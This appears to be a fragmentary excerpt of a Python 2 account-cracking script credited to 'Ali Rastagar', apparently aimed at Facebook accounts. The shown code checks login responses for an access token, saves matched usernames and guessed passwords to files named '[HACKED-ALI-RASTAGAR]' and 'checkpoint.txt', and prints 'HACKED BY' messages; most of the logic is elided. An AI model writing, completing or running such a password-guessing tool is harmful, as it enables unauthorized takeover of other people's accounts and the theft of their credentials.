...
--------------------------------------------------
 Author      : Ali Rastagar 
 GitHub      : https://github.com/AliRastagar0011
 YouTube     : Nadarm
 Telegram    : @Rastagar 
 Blogspot    : Nadarm
--------------------------------------------------
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                okb = open('save/ [HACKED-ALI-RASTAGAR]  .txt', 'a')
                okb.write(k + c + user + '   ' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92mHACKED BY Ali Rastagar \x1b[1;92m ' + k + c + user + '  OK  ' + pass1 + '\n'
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92mHACKED BY Ali Cybery \x1b[1;92m ' + k + c + user + '  OK  ' + pass2 + '\n'
                cps = open('save/checkpoint.txt', 'a')
